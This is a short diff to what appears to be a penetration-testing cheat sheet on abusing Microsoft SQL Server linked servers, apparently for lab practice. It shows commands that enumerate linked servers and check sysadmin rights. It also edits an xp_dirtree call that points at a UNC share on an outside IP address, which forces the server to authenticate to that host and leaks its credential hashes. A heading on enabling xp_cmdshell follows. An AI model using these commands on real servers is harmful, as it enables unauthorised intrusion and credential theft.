@@ -34,7 +34,7 @@ SELECT srvname, isremote FROM sysservers
 
 EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
 
-1> EXECUTE('master..xp_dirtree ''\\10.10.110.17\share\''') AT [10.0.0.12\SQLEXPRESS]
+1> EXECUTE('master..xp_dirtree ''\\10.10.14.177\share\''') AT [LOCAL.TEST.LINKED.SRV]
 2> GO
 ```
 ##### Configure xp_cmdshell
